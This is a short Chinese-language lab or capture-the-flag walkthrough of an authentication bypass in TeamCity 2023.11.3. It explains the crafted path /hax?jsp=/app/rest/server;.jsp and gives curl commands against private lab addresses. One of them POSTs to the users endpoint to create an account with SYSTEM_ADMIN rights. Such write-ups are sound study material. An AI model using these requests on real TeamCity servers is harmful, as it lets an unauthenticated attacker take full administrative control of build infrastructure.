这里的话，发现了它的一个版本信息：TeamCity 2023.11.3，上网搜索会发现它会有cve

为了利用此漏洞成功调用经过身份验证的端点/app/rest/server，未经身份验证的攻击者必须在 HTTP(S) 请求期间满足以下三个要求：

请求未经身份验证的资源，生成 404 响应。这可以通过请求不存在的资源来实现，例如：

/hax

传递一个名为 jsp 的 HTTP 查询参数，其中包含经过身份验证的 URI 路径的值。这可以通过附加 HTTP 查询字符串来实现，例如：

?jsp=/app/rest/server

确保任意 URI 路径以 .jsp 结尾。这可以通过附加 HTTP 路径参数段来实现，例如：

;.jsp

结合以上要求，攻击者的URI路径变为：

复制
/hax?jsp=/app/rest/server;.jsp
通过利用身份验证绕过漏洞，我们可以成功调用无需身份验证的已经过身份验证的端点。

复制
C:\Users\sfewer>curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.jsp

curl -ik 'http://10.10.205.41:50000/hax?jsp=/app/rest/server;.jsp'

然后调整有效载荷并且添加我们的用户 jujube

curl -ik http://10.10.205.41:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H "Content-Type: application/json" --data "{\"username\": \"jujube\", \"password\": \"jujube\", \"email\": \"0xb0b\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"

然后进行登录。成功了。
